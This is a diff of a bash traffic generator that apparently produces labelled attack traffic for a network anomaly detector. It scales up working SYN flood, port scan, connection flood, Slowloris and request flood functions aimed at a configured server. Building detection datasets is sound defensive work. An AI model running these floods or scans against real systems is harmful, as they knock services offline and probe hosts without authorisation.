@@ -125,58 +125,64 @@ normal_downloads() {
 
 attack_syn_flood() {
     # SYN Flood: 大量快速短连接 → 高 SYN rate, 高 new_conn_rate
+    # 200 并发, 不等待全部完成就发下一波
     local duration_sec="$1"
-    echo "  [Attack] SYN Flood (${duration_sec}s)..."
+    echo "  [Attack] SYN Flood (${duration_sec}s, 200 concurrent)..."
     local end_time=$((SECONDS + duration_sec))
     while [ $SECONDS -lt $end_time ]; do
-        # 20 个并发极短连接
-        for i in $(seq 1 20); do
-            curl -s -m 1 -o /dev/null "$BASE_URL/download/1k" 2>/dev/null &
+        for i in $(seq 1 200); do
+            curl -s -m 1 --connect-timeout 1 -o /dev/null "$BASE_URL/download/1k" 2>/dev/null &
         done
-        wait
-        # 不间隔, 尽可能快
+        # 不等全部完成, 只控制进程数不爆炸
+        sleep 0.2
+        # 回收已完成的子进程
+        wait -n 2>/dev/null || true
     done
+    wait 2>/dev/null
 }
 
 attack_port_scan() {
     # Port Scan: 连接不存在的端口 → 高 RST rate, 高 rst_ratio
+    # 用 curl 替代 nc (nc 通过 TUN 不产生 RST), 50 并发
     local duration_sec="$1"
-    echo "  [Attack] Port Scan (${duration_sec}s)..."
+    echo "  [Attack] Port Scan (${duration_sec}s, 50 concurrent)..."
     local end_time=$((SECONDS + duration_sec))
     while [ $SECONDS -lt $end_time ]; do
-        for port in $(shuf -i 1-65535 -n 10 2>/dev/null || seq 1000 1010); do
-            # 尝试连接随机端口, 大部分会被 RST
-            (echo "" | nc -w 1 "$SERVER_IP" "$port" 2>/dev/null) &
+        for i in $(seq 1 50); do
+            local port=$((RANDOM % 64000 + 1024))
+            curl -s -m 1 --connect-timeout 1 -o /dev/null "http://$SERVER_IP:$port/" 2>/dev/null &
         done
-        wait
         sleep 0.1
+        wait -n 2>/dev/null || true
     done
+    wait 2>/dev/null
 }
 
 attack_connection_flood() {
     # Connection Flood: 大量并发 HTTP 请求 → 高 pps, 高 active_connections
+    # 300 并发, 持续压满
     local duration_sec="$1"
-    echo "  [Attack] Connection Flood (${duration_sec}s)..."
+    echo "  [Attack] Connection Flood (${duration_sec}s, 300 concurrent)..."
     local end_time=$((SECONDS + duration_sec))
     while [ $SECONDS -lt $end_time ]; do
-        # 30+ 并发连接
-        for i in $(seq 1 30); do
-            curl -s -m 5 -o /dev/null "$BASE_URL/download/100k" 2>/dev/null &
+        for i in $(seq 1 300); do
+            curl -s -m 5 --connect-timeout 2 -o /dev/null "$BASE_URL/download/100k" 2>/dev/null &
         done
-        wait
+        sleep 0.3
+        wait -n 2>/dev/null || true
     done
+    wait 2>/dev/null
 }
 
 attack_slowloris() {
     # Slowloris: 打开连接后发送极慢的数据 → 高 active_connections, 低 pps
+    # 100 个慢速连接 (之前 15 个太少)
     local duration_sec="$1"
-    echo "  [Attack] Slowloris (${duration_sec}s)..."
+    echo "  [Attack] Slowloris (${duration_sec}s, 100 connections)..."
 
-    # 启动多个慢速连接
     local pids=()
-    for i in $(seq 1 15); do
+    for i in $(seq 1 100); do
         (
-            # 用 nc 发送不完整的 HTTP 请求, 每隔几秒发一点
             {
                 echo -n "GET /download/10m HTTP/1.1\r\nHost: $SERVER_IP\r\n"
                 local inner_end=$((SECONDS + duration_sec))
@@ -188,13 +194,11 @@ attack_slowloris() {
             } | nc -w "$((duration_sec + 5))" "$SERVER_IP" "$HTTP_PORT" 2>/dev/null
         ) &
         pids+=($!)
-        sleep 0.2
+        sleep 0.05
     done
 
-    # 等待 duration 结束
     sleep "$duration_sec"
 
-    # 清理
     for pid in "${pids[@]}"; do
         kill "$pid" 2>/dev/null || true
     done
@@ -203,15 +207,18 @@ attack_slowloris() {
 
 attack_request_flood() {
     # Request Flood: 大量极小请求 → 高 pps, 小 avg_pkt_size
+    # 500 并发极小请求
     local duration_sec="$1"
-    echo "  [Attack] Request Flood (${duration_sec}s)..."
+    echo "  [Attack] Request Flood (${duration_sec}s, 500 concurrent)..."
     local end_time=$((SECONDS + duration_sec))
     while [ $SECONDS -lt $end_time ]; do
-        for i in $(seq 1 50); do
-            curl -s -m 2 -o /dev/null "$BASE_URL/api/status" 2>/dev/null &
+        for i in $(seq 1 500); do
+            curl -s -m 2 --connect-timeout 1 -o /dev/null "$BASE_URL/api/status" 2>/dev/null &
         done
-        wait
+        sleep 0.2
+        wait -n 2>/dev/null || true
     done
+    wait 2>/dev/null
 }
 
 # ============================================================================
